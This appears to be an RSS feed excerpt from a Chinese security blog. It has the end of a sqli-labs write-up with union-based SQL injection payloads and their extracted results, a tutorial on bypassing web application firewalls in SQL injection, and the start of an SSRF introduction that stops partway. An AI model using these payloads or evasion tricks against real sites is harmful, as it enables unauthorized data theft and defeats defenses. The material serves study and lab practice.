&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?id=1&#39; order by 3--+
?id=1&#39; order by 4--+

结果为3
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;判断可注入的字段位置：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?id=-1&#39; union select 1,2,3 --+

2和3可以
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;查询表名：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?id=-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=&#39;challenges&#39;) --+

表名F6ZVUD1OQV
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;查询列名：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?id=-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=&#39;F6ZVUD1OQV&#39;)--+

id,sessid,secret_MJF9,tryy
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;查目标结果：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?id=-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(secret_MJF9)+FROM+F6ZVUD1OQV)--+

5p85ATWNXGEvh89AXJ4GteMe
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;less-55-57&#34;&gt;Less-55-57&lt;/h2&gt;
&lt;p&gt;与Less-54类似，只是在闭合方式上有变化&lt;/p&gt;
&lt;h2 id=&#34;less-58&#34;&gt;Less-58&lt;/h2&gt;
&lt;p&gt;与Less-54相比，这一关在输出信息时不是直接将查询结果返回，而是根据查询结果中的id字段从硬编码数组中取信息，这样union注入就无用了&lt;/p&gt;
&lt;p&gt;但是又输出了报错信息，因此可利用报错注入&lt;/p&gt;
&lt;h2 id=&#34;less-59-65&#34;&gt;Less-59-65&lt;/h2&gt;
&lt;p&gt;与Less58类似，只是在闭合方式和注入类型少有区别&lt;/p&gt;
</description>
        </item>
        <item>
        <title>SQL 注入绕 WAF</title>
        <link>https://coollllllll.github.io/p/sql-waf/</link>
        <pubDate>Fri, 09 Oct 2020 00:00:00 +0000</pubDate>
        
        <guid>https://coollllllll.github.io/p/sql-waf/</guid>
        <description>&lt;img src="https://coollllllll.github.io/p/sql-waf/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post SQL 注入绕 WAF" /&gt;&lt;h1 id=&#34;sql注入绕waf规则&#34;&gt;SQL注入绕WAF规则&lt;/h1&gt;
&lt;h2 id=&#34;waf简述&#34;&gt;WAF简述&lt;/h2&gt;
&lt;p&gt;WAF(Web Application Firewall)，web应用防火墙，其通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护。&lt;/p&gt;
&lt;p&gt;即通过一系列规则对请求内容进行检测，对所有不符合其定义的安全规则的请求进行拦截。&lt;/p&gt;
&lt;h3 id=&#34;工作流程&#34;&gt;工作流程&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;请求预处理 -&amp;gt; 规则检测 -&amp;gt; 后处理&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;预处理：判断流量是否为http/s -&amp;gt; 判断url是否在白名单，是则直接交后端，否则进行规则检测&lt;/p&gt;
&lt;p&gt;规则检测：对http/s请求内容进行规则匹配&lt;/p&gt;
&lt;p&gt;后处理：根据检测结果拦截请求，给出相应的响应&lt;/p&gt;
&lt;h3 id=&#34;分类&#34;&gt;分类&lt;/h3&gt;
&lt;h4 id=&#34;软waf&#34;&gt;软WAF&lt;/h4&gt;
&lt;p&gt;以纯软件方式实现并安装在服务器上，直接拦截流量并分析&lt;/p&gt;
&lt;p&gt;如：安全狗、云锁、D盾等&lt;/p&gt;
&lt;h4 id=&#34;硬waf&#34;&gt;硬WAF&lt;/h4&gt;
&lt;p&gt;以硬件形式部署在链路中，支持多种部署方式，当串联在链路中可以拦截恶意流量，在旁路监听时只警告和记录但不拦截&lt;/p&gt;
&lt;p&gt;如：imperva、天清WAG等&lt;/p&gt;
&lt;h4 id=&#34;云waf&#34;&gt;云WAF&lt;/h4&gt;
&lt;p&gt;一般以反向代理的方式工作，通过配置NS或CNAME记录使得对网站的请求先经过WAF，经过过滤后再放给实际后台服务器&lt;/p&gt;
&lt;h4 id=&#34;嵌入式自定义waf&#34;&gt;嵌入式自定义WAF&lt;/h4&gt;
&lt;p&gt;一般会在Web中嵌入自定义的WAF功能，更加自由，与具体业务紧密结合&lt;/p&gt;
&lt;h2 id=&#34;基本绕过&#34;&gt;基本绕过&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;MySQL&lt;/th&gt;
&lt;th&gt;Oracle&lt;/th&gt;
&lt;th&gt;MSSQL&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;注释&lt;/td&gt;
&lt;td&gt;/**/、#、/*!*/、&amp;ndash;+、&amp;ndash;&lt;code&gt; &lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&amp;ndash;、/**/&lt;/td&gt;
&lt;td&gt;&amp;ndash;、/**/&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;空白符&lt;/td&gt;
&lt;td&gt;%09、%0A、%0B、%0C、%0D、%20、%a0&lt;/td&gt;
&lt;td&gt;%09、%0A、%0B、%0C、%0D、%20、%a0&lt;/td&gt;
&lt;td&gt;%00-%20&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;空格过滤&#34;&gt;空格过滤&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-mysql&#34; data-lang=&#34;mysql&#34;&gt;&lt;span class=&#34;n&#34;&gt;seelect&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;User&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Password&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;union&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;mysql&#34;&gt;MySQL&lt;/h4&gt;
&lt;p&gt;位置(1)：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;利用控制字符替换空格：%09、%0A、%0B、%0C、%0D、%20、%a0&lt;/li&gt;
&lt;li&gt;利用注释符替换空格：/**/、/*!*/、—+haha%0d%0a&lt;/li&gt;
&lt;li&gt;利用数学运算和数据类型：Host=0.1、Host=0E0、Host=\N&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;内联注释&lt;code&gt;/*!*/&lt;/code&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;/*!50173sleep(3)*/ 
# 感叹号！ 后所接的数字是版本号 ,当目前数据库版本号大于等于所写版本号时，注释里的sql语句会被执行，反之则会被当作注释。
&lt;/code&gt;&lt;/pre&gt;&lt;/blockquote&gt;
&lt;p&gt;位置(2)：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;利用控制字符和注释符&lt;/li&gt;
&lt;li&gt;利用括号：union(select user,2)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;位置(3):&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;利用控制字符和注释符&lt;/li&gt;
&lt;li&gt;利用特性符号：+、-、~、!、@&lt;/li&gt;
&lt;li&gt;利用小括号：union select (user),2&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;位置(4)：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;利用控制字符和注释符&lt;/li&gt;
&lt;li&gt;利用数学运算和数据类型：&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-mysql&#34; data-lang=&#34;mysql&#34;&gt;&lt;span class=&#34;k&#34;&gt;union&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;union&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;E0from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;union&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Nfrom&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;利用花括号:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-mysql&#34; data-lang=&#34;mysql&#34;&gt;&lt;span class=&#34;k&#34;&gt;union&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;union&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;位置(5)：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;利用控制字符和注释符&lt;/li&gt;
&lt;li&gt;利用花括号：union select user,2 from{x`test`};&lt;/li&gt;
&lt;li&gt;利用反引号：union select user,2 from`test`;&lt;/li&gt;
&lt;li&gt;利用小括号：union select user,2 from(test);&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;sql-server&#34;&gt;SQL Server&lt;/h4&gt;
&lt;p&gt;位置(1)：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;利用控制字符替换空格：%01~%0F、%11~%1F&lt;/li&gt;
&lt;li&gt;利用注释符替换空格：/**/、&amp;ndash;+haha%0d0a&lt;/li&gt;
&lt;li&gt;利用数学运算符及数据类型：Host=0.1、Host=0E0、Host=1-1&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;位置(2)：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;利用控制字符和注释符&lt;/li&gt;
&lt;li&gt;利用+替换空格：union+select&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;位置(3)：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;利用控制字符和注释符&lt;/li&gt;
&lt;li&gt;利用：+、-、~、.(其中后三个符号需要select后的第一个字段为数字型才可以)&lt;/li&gt;
&lt;li&gt;利用小括号&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;位置(4)：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;利用控制字符和注释符&lt;/li&gt;
&lt;li&gt;利用：%80-%FF(需要在IIS环境下)&lt;/li&gt;
&lt;li&gt;利用数学运算及数据类型&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;位置(5)：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;利用控制字符和注释符&lt;/li&gt;
&lt;li&gt;利用.替换空格：from.test&lt;/li&gt;
&lt;li&gt;利用中括号：from[test]&lt;/li&gt;
&lt;li&gt;利用：%80-%FF(需要在IIS环境下)&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;oracle&#34;&gt;Oracle&lt;/h4&gt;
&lt;p&gt;位置(1)：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;利用控制字符：%00、%09、%0a、%0b、%0c、%0d、%1f、%1d、%20&lt;/li&gt;
&lt;li&gt;利用.替换空格&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;位置(2)：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;利用控制字符&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;位置(3)：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;利用控制字符&lt;/li&gt;
&lt;li&gt;利用：+、-、%ad&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;位置(4)：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;利用部分控制字符：%09、%0a、%0c、%0d&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;位置(5)：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;利用部分控制字符：%09、%0a、%0c、%0d&lt;/li&gt;
&lt;li&gt;利用：%30-%ff、%24、%7b%22-%7b%76&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;敏感函数关键字过滤&#34;&gt;敏感函数、关键字过滤&lt;/h3&gt;
&lt;h4 id=&#34;大小写绕过&#34;&gt;大小写绕过&lt;/h4&gt;
&lt;p&gt;UniOn、SelEct等&lt;/p&gt;
&lt;h4 id=&#34;双写绕过&#34;&gt;双写绕过&lt;/h4&gt;
&lt;p&gt;uniunionon&lt;/p&gt;
&lt;h4 id=&#34;编码绕过&#34;&gt;编码绕过&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;双重或多重url编码绕过&lt;/li&gt;
&lt;li&gt;在IIS服务器环境下，可以使用unicode编码进行绕过：IIS会处理unicode编码的字符，而WAF中可能会不处理从而绕过、&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;配合特殊字符绕过&#34;&gt;配合特殊字符绕过&lt;/h4&gt;
&lt;p&gt;user()函数 =&amp;gt; user/**/()&lt;/p&gt;
&lt;h4 id=&#34;函数等价替换&#34;&gt;函数等价替换&lt;/h4&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;mid(str,1,1)&lt;/td&gt;
&lt;td&gt;substr(user() from 1 for 1)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;mid(str,1,1)&lt;/td&gt;
&lt;td&gt;LPAD(user(),1,1)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;mid(str,1,1)&lt;/td&gt;
&lt;td&gt;LPAD(REVERSE(TRIM( lpad(user(),1,SPACE(1)) )),1,SPACE(1)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ascii(char)、ord(char)&lt;/td&gt;
&lt;td&gt;conv(hex(char),16,10)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;..&lt;/td&gt;
&lt;td&gt;..&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&#34;关键字等价替换&#34;&gt;关键字等价替换&lt;/h4&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;逗号过滤：if(mid(str,1,1)=&amp;lsquo;a&amp;rsquo;,1,1)&lt;/td&gt;
&lt;td&gt;case when mid(str from 1 for 1)=&amp;lsquo;a&amp;rsquo; then 1 else 0 end&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;逗号过滤：union select 1,2&lt;/td&gt;
&lt;td&gt;union select * from (select 1)a join (select 2)b&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;逗号过滤：limit 2,1&lt;/td&gt;
&lt;td&gt;limit 1 offset 2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;=&lt;/td&gt;
&lt;td&gt;like、rlike、regexp、!(id&amp;lt;&amp;gt;1)、strcmp()、find_in_set()&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&amp;lt;,&amp;gt;&lt;/td&gt;
&lt;td&gt;least(ord(&amp;lsquo;r&amp;rsquo;),115)、greatest()、between n and m&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;其他方式绕过&#34;&gt;其他方式绕过&lt;/h2&gt;
&lt;h3 id=&#34;异常method绕过&#34;&gt;异常method绕过&lt;/h3&gt;
&lt;p&gt;有些WAF在获取到的参数后(Apache 2.x 无论method为何值都会取出GET中的内容)，判断为GET、POST方法进行才进行检测，因此可以随意构造异常的method进行绕过&lt;/p&gt;
&lt;h3 id=&#34;大数据包绕过&#34;&gt;大数据包绕过&lt;/h3&gt;
&lt;p&gt;有些WAF只检测&lt;/p&gt;
&lt;h3 id=&#34;http参数污染绕过&#34;&gt;HTTP参数污染绕过&lt;/h3&gt;
&lt;p&gt;当传入同名的多个参数值时，服务端与waf的处理方式可能会有不同，因此可利用进行绕过。主流的服务端配置对同名参数的处理情况：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Web服务器&lt;/th&gt;
&lt;th&gt;获取到的参数&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;PHP/Apache&lt;/td&gt;
&lt;td&gt;最后一个&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;JSP/Tomcat&lt;/td&gt;
&lt;td&gt;第一个&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Perl(CGI)/Apache&lt;/td&gt;
&lt;td&gt;第一个&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Python/Apache&lt;/td&gt;
&lt;td&gt;所有(返回list)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ASP/IIS&lt;/td&gt;
&lt;td&gt;所有(返回以逗号分隔的字符串)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;协议未覆盖绕过&#34;&gt;协议未覆盖绕过&lt;/h3&gt;
&lt;p&gt;Content-Type类型：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Content-Type:multipart/form-data&lt;/li&gt;
&lt;li&gt;Content-Type:application/x-www-form-urlencoded&lt;/li&gt;
&lt;li&gt;Content-Type: text/xml&lt;/li&gt;
&lt;li&gt;Content-Type: application/json&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;有些WAF可能只对一种Content-Type进行检测，可以尝试使用其他类型进行绕过&lt;/p&gt;
&lt;h3 id=&#34;宽字节绕过&#34;&gt;宽字节绕过&lt;/h3&gt;
&lt;p&gt;当使用GBK编码，且为了防止SQL注入对单引号进行转义，即在单引号前加入反斜杠，因此可以预先加入一个可被识别为GBK编码的 一字节，转义后加入反斜杠，两字节被识别为GBK编码的汉字，成功吃掉反斜杠实现单引号逃逸&lt;/p&gt;
&lt;h3 id=&#34;00截断绕过&#34;&gt;%00截断绕过&lt;/h3&gt;
&lt;p&gt;部分WAF解析参数遇到%00就认为结束，因此可通过在%00后加入参数绕过WAF检测&lt;/p&gt;
&lt;h3 id=&#34;http请求走私&#34;&gt;HTTP请求走私&lt;/h3&gt;
</description>
        </item>
        <item>
        <title>SSRF 相关</title>
        <link>https://coollllllll.github.io/p/ssrf/</link>
        <pubDate>Fri, 09 Oct 2020 00:00:00 +0000</pubDate>
        
        <guid>https://coollllllll.github.io/p/ssrf/</guid>
        <description>&lt;img src="https://coollllllll.github.io/p/ssrf/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post SSRF 相关" /&gt;&lt;h1 id=&#34;ssrf&#34;&gt;SSRF&lt;/h1&gt;
&lt;h2 id=&#34;定义&#34;&gt;定义&lt;/h2&gt;
&lt;p&gt;服务端请求伪造:Server-Side Request Forgery，由攻击者构造使服务端发起请求的漏洞。该请求可以发送至本机、本机所在内网其他服务器、外网等。&lt;/p&gt;
&lt;p&gt;一般情况下针对&lt;code&gt;无法从外网直接访问的内部系统&lt;/code&gt;。&lt;/p&gt;
&lt;h2 id=&#34;原理&#34;&gt;原理&lt;/h2&gt;
&lt;p&gt;服务端提供从其他服务器获取应用数据的功能，但是对其他服务器的地址没有过滤和限制。例如指定url获取网页文本、加载图片等等。&lt;/p&gt;
&lt;p&gt;本质上就是利用存在漏洞的服务器作为跳板攻击内部或远程服务器。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 122; 
			flex-basis: 293px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/ssrf/image-20211219200220919.png&#34; data-size=&#34;1168x956&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/ssrf/image-20211219200220919.png&#34;
			width=&#34;1168&#34;
			height=&#34;956&#34;
			srcset=&#34;https://coollllllll.github.io/p/ssrf/image-20211219200220919_hu80adfba74d957e51070a997d28508bf2_202188_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/ssrf/image-20211219200220919_hu80adfba74d957e51070a997d28508bf2_202188_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;常见漏洞场景&#34;&gt;常见漏洞场景&lt;/h2&gt;
&lt;h3 id=&#34;加载图片等资源&#34;&gt;加载图片等资源&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;http://www.test.com/xxx.php?url=http://127.0.0.1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;例如某应用加载选择从远程服务器加载图片到本地，如上述url，如果未作限制和过滤可能会存在漏洞&lt;/p&gt;
&lt;h3 id=&#34;分享功能&#34;&gt;分享功能&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;http://www.test.com/xxx.php?url=http://www.haha.com
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;例如某应用通过传递url参数的方式进行分享内容的跳转&lt;/p&gt;
&lt;h3 id=&#34;收藏功能&#34;&gt;收藏功能&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;http://www.test.com/xxx.php?url=http://www.test.com/aaa
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;例如某应用通过传递url参数进行文章、图片等内容的收藏&lt;/p&gt;
&lt;h3 id=&#34;网页源代码中查找带有关键词的url或接口&#34;&gt;网页源代码中查找带有关键词的url或接口&lt;/h3&gt;
&lt;p&gt;share、wap、url、src、source、target、u、3g、display、sourceURl、imageURL、domain等等&lt;/p&gt;
&lt;h3 id=&#34;php中常见的可能引发ssrf的函数&#34;&gt;PHP中常见的可能引发SSRF的函数&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;file_get_contents()&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;如果file_get_contents函数参数可控，可构造url获取本地敏感文件
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;fsockopen()&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;fsockopen(
    string $hostname,
    int $port = -1,
    int &amp;amp;$errno = ?,
    string &amp;amp;$errstr = ?,
    float $timeout = ini_get(&amp;quot;default_socket_timeout&amp;quot;)
): resource
该函数打开一个网络连接或者Unix套接字连接到指定主机($hostname)，返回一个文件句柄，之后可以被其他文件类函数调用（例如：fgets()，fgetss()，fwrite()，fclose()还有feof()）。如果调用失败，将返回false。
